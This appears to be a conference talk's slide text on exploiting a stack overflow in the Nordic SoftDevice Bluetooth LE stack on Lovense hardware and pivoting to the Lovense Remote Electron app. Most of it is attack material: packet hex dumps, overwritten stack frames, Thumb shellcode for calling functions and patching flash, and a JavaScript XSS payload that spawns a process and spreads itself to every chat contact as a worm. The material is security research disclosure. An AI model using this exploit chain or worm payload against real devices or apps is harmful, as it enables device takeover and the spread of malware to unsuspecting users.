attribute_data->handle = *(u16*)input_buf_cursor;
attribute_data->value_ptr = &input_buf_cursor[2];
input_buf_cursor += attribute_data_length;
input_remaining_len -= attribute_data_length;
num_attributes++;
attribute_data++;
}
*status = 0;
break;
...
}
Offset(h) 00 01 02 03 04 05 06 07
00000000  09 00 0D 00 BE BA AD DE
00000008  0E 00 DE C0 AD 0B 0F 00 
00000010  AD FD EE 0B
Sample Packet:
attribute_array:
Offset(h) 00 01 02 03 04 05 06 07
00000000  0D 00 00 00 04 24 00 20
00000008  0D 00 00 00 04 24 00 20
00000010  0D 00 00 00 04 24 00 20
00000018  0D 00 00 00 04 24 00 20
00000020  0D 00 00 00 04 24 00 20
00000028  0D 00 00 00 04 24 00 20
00000030  0D 00 00 00 04 24 00 20
00000038  0D 00 00 00 04 24 00 20
00000040  0D 00 00 00 04 24 00 20
00000048  0D 00 00 00 04 24 00 20
00000050  0D 00 00 00 04 24 00 20
00000058  0D 00 00 00 04 24 00 20
00000060  0D 00 00 00 04 24 00 20
00000068  0D 00 00 00 04 24 00 20
value_ptr
Read by type response handler: malformed packet
Out of 
bounds
switch(input_buf[0] & 0x3F)
{
attributePair_s attribute_array[10];
...
case 0x09: // GATT Read By Type Response
if ( !(*status & 0x10) || input_len handle = *(u16*)input_buf_cursor;
attribute_data->value_ptr = &input_buf_cursor[2];
input_buf_cursor += attribute_data_length;
input_remaining_len -= attribute_data_length;
num_attributes++;
attribute_data++;
}
*status = 0;
break;
...
}
Offset(h) 00 01 02 03 04 05 06 07
00000000  09 01 0D 00 BE BA AD DE
00000008  0E 00 DE C0 AD 0B 0F 00
Sample Packet:
attribute_array:
Offset(h) 00 01 02 03 04 05 06 07
00000000  0D 00 00 00 04 24 00 20
00000008  00 BE 00 00 05 24 00 20
00000010  BE BA 00 00 06 24 00 20
00000018  BA AD 00 00 07 24 00 20
00000020  AD DE 00 00 08 24 00 20
00000028  DE 0E 00 00 09 24 00 20
00000030  0E 00 00 00 0A 24 00 20
00000038  00 DE 00 00 0B 24 00 20
00000040  DE C0 00 00 0C 24 00 20
00000048  C0 AD 00 00 0D 24 00 20
00000050  AD 0B 00 00 0E 24 00 20
00000058  0B 0F 00 00 0F 24 00 20
00000060  0F 00 00 00 10 24 00 20
value_ptr
Read by type response handler: malformed packet
Out of 
bounds
• By setting attribute length to 0x01, we 
can overflow many handle/data 
pointer pairs
• Handles are 2 bytes, but dword aligned
• Upper 2 bytes of handle dwords aren’t 
cleared
• The buffer we overflow is on the stack
• No stack cookies, no ASLR, no DEP
• => should be trivial
Nordic SoftDevice BLE vulnerabilities: exploitation
200046A0 = 20000008 00003D01 00000001 00000005
200046B0 = 00000005 00009045 200046F0 20000CE0
200046C0 = 00000000 00000000 0003EF14 00010633
200046D0 = 20004718 00002F4F 20004718 FFFFFFF1
200046E0 = 20004710 00000004 00000005 0000B985
200046F0 = 00000000 20001F00 00000016 200046A8
20004700 = 200024AA 00000016 20000850 00000017
20004710 = 200024A7 2000042C 00000000 20001EB2
20004720 = 2000042C 00000000 200024A7 0000569B
20004730 = 20001EB2 00000000 00000017 200024A7
20004740 = 2000042C 2000042C 00000004 00000000
Stack frame before overflow:
Return address
Saved registers
attributes_array
• Test: send packet full of 0xDA bytes 
with attribute length 0x01
• => we overwrite the return address with a 
pointer to our attribute data
• Since there’s no DEP, that means we can just 
execute data within our packet!
• Restriction: we need our return address to 
have its LSB set so that we execute in thumb 
mode (Cortex M0 doesn’t support ARM mode)
• => we overwrite several local variables
• Need to see if we overwrite anything used on 
the return path
Nordic SoftDevice BLE vulnerabilities: exploitation
Stack frame after overflow:
200046A0 = 20000008 00150001 2000DADA 20002476
200046B0 = 0001DADA 20002477 0000DADA 20002478
200046C0 = 2000DADA 20002479 0000DADA 2000247A
200046D0 = 2000DADA 2000247B 2000DADA 2000247C
200046E0 = 2000DADA 2000247D 0000DADA 2000247E
200046F0 = 0000DADA 2000247F 0000DADA 20002480
20004700 = 2000DADA 20002481 2000DADA 20002482
20004710 = 2000DADA 20002483 0000DADA 20002484
20004720 = 2000DADA 20002485 2000DADA 20002486
20004730 = 2000DADA 20002487 0000DADA 20002488
20004740 = 2000DADA 20002489 0000DADA 2000248A
Return address
Saved registers
attributes_array
Nordic SoftDevice BLE vulnerabilities: exploitation
Stack frame after overflow:
200046A0 = 20000008 00150001 2000DADA 20002476
200046B0 = 0001DADA 20002477 0000DADA 20002478
200046C0 = 2000DADA 20002479 0000DADA 2000247A
200046D0 = 2000DADA 2000247B 2000DADA 2000247C
200046E0 = 2000DADA 2000247D 0000DADA 2000247E
200046F0 = 0000DADA 2000247F 0000DADA 20002480
20004700 = 2000DADA 20002481 2000DADA 20002482
20004710 = 2000DADA 20002483 0000DADA 20002484
20004720 = 2000DADA 20002485 2000DADA 20002486
20004730 = 2000DADA 20002487 0000DADA 20002488
20004740 = 2000DADA 20002489 0000DADA 2000248A
Return address
Saved registers
attributes_array
...
switch(input_buf[0] & 0x3F)
{
case 0x09: // GATT Read By Type Response
...
*status = 0;
break;
}
sub_1185A(3, saved_arg_3);
...
int value = *(int*)saved_arg_4;
...
}
=> We need to make it such that saved_arg_3 is 0, 
saved_arg_4 is dword-aligned and LR’s LSB is set
Nordic SoftDevice BLE vulnerabilities: exploitation
Incoming BLE packet ring buffer:
20002400 = 14 24 00 20 00 00 00 00 00 00 00 00 00 00 00 00
20002410 = 00 00 00 00 A8 00 48 02 8B 00 67 00 00 80 67 00
20002420 = 67 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00
20002430 = 00 00 00 00 1B 00 00 00 00 1A 1B 00 17 00 04 00
20002440 = 11 A4 0F CC 98 47 02 48 10 21 01 70 15 B0 F0 BD
20002450 = B2 1E 00 20 BE BE BE 1B 00 00 00 00 16 1B 00 17
20002460 = 00 04 00 BA BA BA BA BA BA BA BA BA BA BA BA BA
20002470 = BA BA BA BA BA BA BA BA BA BA 19 00 00 00 00 1A
20002480 = 19 00 15 00 04 00 B0 B0 00 00 00 00 00 00 00 00
20002490 = 00 00 00 00 07 3C 00 20 B0 B0 B0 1B 00 00 00 00
200024A0 = 06 1B 00 17 00 04 00 09 01 DA DA DA DA DA DA DA
200024B0 = DA DA DA DA DA DA DA 00 93 DA C1 E7 DA DA 04 49
Wireshark:
=> We can control packet alignment by changing 
previous packets’ lengths
• Engineering hurdle: the Nordic SoftDevice
doesn’t provide an interface to send raw 
BLE packets
• Option 1: implement our own BLE stack
• Option 2: hack some hooks into theirs
• I picked option 2 ☺
• Hooks are very simple but require some RE
• It’s on github in case anyone else wants to try 
their hand at exploiting BLE stack bugs
• The interface is pretty dirty, no guarantees it’ll 
work for you… but it did for me
Nordic SoftDevice BLE vulnerabilities: exploitation
void ble_outgoing_hook(uint8_t* buffer, uint8_t length);
int ble_incoming_hook(uint8_t* buffer, uint16_t length);
int send_packet(void* handle, void* buffer, uint16_t length);
Called by SoftDevice whenever a BLE packet is 
sent so it can be modified beforehand.
Called by SoftDevice whenever a BLE packet is 
received. Return value determines whether 
normal SoftDevice processing should be skipped.
Function to send a raw packet on a given BLE 
connection.
Nordic SoftDevice BLE vulnerabilities: exploitation
Incoming BLE packet ring buffer:
20002400 = 14 24 00 20 00 00 00 00 00 00 00 00 00 00 00 00
20002410 = 00 00 00 00 A8 00 48 02 8B 00 67 80 00 00 67 80
20002420 = 67 80 00 00 00 00 00 00 1B 00 00 00 01 00 00 00
20002430 = 00 00 00 00 1B 00 00 00 00 1A 1B 00 17 00 04 00
20002440 = 11 A4 0F CC 98 47 02 48 10 21 01 70 15 B0 F0 BD
20002450 = B2 1E 00 20 BE BE BE 1B 00 00 00 00 16 1B 00 17
20002460 = 00 04 00 BA 06 00 FC 01 16 02 00 B5 72 B6 00 F0
20002470 = 1C F8 8A 48 00 F0 F4 F8 88 48 19 00 00 00 00 1A
20002480 = 19 00 15 00 04 00 B0 B0 00 3C 00 20 64 24 00 20
20002490 = 16 00 00 00 CD B1 01 00 B0 B0 B0 1B 00 00 00 00
200024A0 = 16 1B 00 17 00 04 00 09 01 DA DA DA DA DA DA DA
200024B0 = DA DA DA DA DA DA DA 00 00 DA C1 E7 DA DA 04 49
• How do we execute more than 4 
bytes of code at a time…?
• Send multiple packets!
1. Shellcode that performs a 
function call with controlled 
parameters, then returns cleanly.
2. A data buffer that can be used by 
the function call
3. A buffer containing the function 
call’s parameter values
4. The vuln-triggering packet
Nordic SoftDevice BLE vulnerabilities: exploitation
Incoming BLE packet ring buffer:
20002400 = 14 24 00 20 00 00 00 00 00 00 00 00 00 00 00 00
20002410 = 00 00 00 00 A8 00 48 02 8B 00 67 80 00 00 67 80
20002420 = 67 80 00 00 00 00 00 00 1B 00 00 00 01 00 00 00
20002430 = 00 00 00 00 1B 00 00 00 00 1A 1B 00 17 00 04 00
20002440 = 11 A4 0F CC 98 47 02 48 10 21 01 70 15 B0 F0 BD
20002450 = B2 1E 00 20 BE BE BE 1B 00 00 00 00 16 1B 00 17
20002460 = 00 04 00 BA 06 00 FC 01 16 02 00 B5 72 B6 00 F0
20002470 = 1C F8 8A 48 00 F0 F4 F8 88 48 19 00 00 00 00 1A
20002480 = 19 00 15 00 04 00 B0 B0 00 3C 00 20 64 24 00 20
20002490 = 16 00 00 00 CD B1 01 00 B0 B0 B0 1B 00 00 00 00
200024A0 = 16 1B 00 17 00 04 00 09 01 DA DA DA DA DA DA DA
200024B0 = DA DA DA DA DA DA DA 00 00 DA C1 E7 DA DA 04 49
; load our parameters from packet 3
add r4, pc, #0x44
ldmia r4!, {r0-r3}
blx r3
; the following is needed so that we 
can send more vuln-triggering packets
ldr r0, =0x20001EB2
mov r1, #0x10
strb r1, [r0]
add sp, #0x54
pop {r4-r7,pc}
b 0x20002440
• Since we can repeatably call any given 
function with controlled parameters and 
data, we call memcpy to write larger 
shellcode in RAM little by little
• Then we can call it, have it apply patches to 
the dongle’s code in flash, and use that to 
compromise the computer app
• Since the XSS payload is large, we generate it 
in shellcode on the dongle rather than send it 
over
Nordic SoftDevice BLE vulnerabilities: exploitation
cpsid i
; generate our html payload and put it in flash
bl generate_html_payload
; first erase unused page of flash (so we can copy stuff to it)
ldr r0, =SCRATCH_PAGE
bl nvmc_page_erase
; then copy our target page to last page of flash
ldr r0, =SCRATCH_PAGE
ldr r1, =MOD_PAGE
ldr r2, =0x400
bl nvmc_write
; now erase target page
ldr r0, =MOD_PAGE
bl nvmc_page_erase
...
cpsie i
; and we're done!
pop {pc}
BLE
Internet
USB
Lovense compromise map
The compromise now goes both ways: the 
dongle can compromise the toy, and the toy can 
compromise the dongle… and the computer
• We can XSS into an electron process 
• It’s still just JavaScript, right?
• Wrong: electron lets you interact with files on 
disk, spawn new processes etc
• In fact, this is how dongle DFU works
• But it’s chromium-based, so it’s sandboxed?
• Not in this case: lovense.exe run at Medium IL
• It’s not admin level privileges, but we can still 
access and modify basically all of the user’s files, 
access network etc
Lovense remote: what does XSS give us?
i.i(p.spawn)(this.exePath, ["dfu", "serial", 
"--package=" + this.filename, "--port=" + 
this.dongle.portInfo.comName, "--baudrate=" + 
this.baudrate]);
Dongle DFU code (app.js):
lovense.exe in Process Explorer:
• The social feature has a lot of functionality
• Text chat, pictures, remote control, video chat…
• In theory, a lot of attack surface to explore
• In practice though…
• …the most basic XSS possible works: sending 
HTML over as a text chat message
• Making this viral becomes trivial: just figure 
out the right function to send messages from 
JavaScript and spam your friends
Lovense remote: can we make this viral?
Lovense remote: final XSS payload
if(window.hacked != true)
{
window.hacked = true;
const { spawn } = require('child_process');
spawn('calc.exe', []);
var testo = window.webpackJsonp([], [], [7]);
var b = function(e, t, a) {
this.jid = e.split("/")[0],
this.fromJid = t.split("/")[0],
this.text = a, this.date = new Date
};
for(friend in testo.hy.contact.friendList)
{
testo.hy.message.sendMessage(new b(friend, testo.hy.chat.jid,
""));
}
}
1. Do whatever malicious 
thing we feel like doing on 
this victim machine
2. Grab the JavaScript object 
that will let us access chat
3. Send an XSS payload that 
will load this script to every 
friend we have
1
2
3
BLE
Internet
USB
Lovense compromise map
We can now compromise any device from 
any device – we’ve created a butt worm
Live demo
Conclusion